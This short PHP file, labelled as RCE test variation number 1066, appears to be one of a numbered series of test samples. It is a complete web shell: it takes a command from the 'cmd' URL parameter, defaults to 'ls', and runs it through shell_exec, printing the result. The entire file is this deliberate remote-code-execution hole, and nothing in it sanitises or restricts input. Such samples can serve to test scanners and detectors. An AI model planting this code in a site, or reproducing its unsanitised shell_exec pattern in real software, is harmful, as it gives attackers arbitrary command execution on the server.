<?php
// RCE test variation #1066
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>